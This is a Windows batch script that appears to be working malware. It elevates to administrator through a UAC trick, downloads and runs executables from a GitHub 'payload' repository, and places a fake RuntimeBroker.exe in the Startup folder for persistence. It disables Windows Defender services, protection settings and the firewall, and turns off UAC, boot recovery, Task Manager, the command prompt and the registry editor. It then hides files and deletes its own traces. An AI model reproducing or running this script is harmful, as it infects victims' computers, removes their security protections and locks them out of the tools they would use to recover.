@echo off 
call getCmdPid
call windowMode -pid %errorlevel% -mode hidden
::--------------------------------------
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
::--------------------------------------
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
::--------------------------------------
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
::--------------------------------------
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
::--------------------------------------
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
::--------------------------------------
cd "C:\Users\%USERNAME%\AppData\Local"
mkdir Anon
attrib +h Anon /s /d
::--------------------------------------
Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/fun.jpg' -OutFile C:\Users\%USERNAME%\AppData\Local\Anon\fun.jpg"
Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/ss.jpg' -OutFile %TEMP%\ss.jpg"
Powershell start "C:\Users\%USERNAME%\AppData\Local\Anon\fun.jpg"
::--------------------------------------
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %TEMP%\ss.jpg /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
::--------------------------------------
set pop=%systemroot%
Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/NSudoLG.exe' -OutFile %TEMP%\NSudoLG.exe"
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\MsSecFlt" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\SgrmAgent" /v "Start" /t REG_DWORD /d "4" /f >nul
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide reg add "HKLM\SYSTEM\ControlSet001\Services\SgrmBroker" /v "Start" /t REG_DWORD /d "4" /f >nul
::--------------------------------------
reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Hidden" /t REG_DWORD /f /d "0" >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSuperHidden" /t REG_DWORD /d "0" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideFileExt" /t REG_DWORD /d "1" /f >nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f >nul
reg add "HKCU\Software\Policies\Microsoft\MMC\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v "Restrict_Run" /t REG_DWORD /d "1" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f >nul
::--------------------------------------
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide sc stop windefend
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide sc delete windefend
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide bcdedit /set {default} recoveryenabled No
%TEMP%\NSudoLG -U:T -P:E -ShowWindowMode:Hide bcdedit /set {default} bootstatuspolicy ignoreallfailures
::--------------------------------------
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
powershell.exe -command "Set-MpPreference -PUAProtection disable"
powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"
powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"  
powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"
powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"
powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
powershell.exe -command "netsh advfirewall set allprofiles state off"
::--------------------------------------
cd %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/RuntimeBroker.exe' -OutFile RuntimeBroker.exe" && start RuntimeBroker.exe"
Powershell -Command "Invoke-WebRequest 'https://github.com/anonymous-osif/payload/raw/main/ss/RuntimeBroker.exe' -OutFile %TEMP%\RuntimeBroker.exe" && Powershell start "%TEMP%\RuntimeBroker.exe"
rmdir /s /q "C:\Users\%USERNAME%\AppData\Local\Anon\" && del "%TEMP%\NSudoLG.exe" && taskkill /f /IM explorer.exe && Powershell start explorer.exe && exit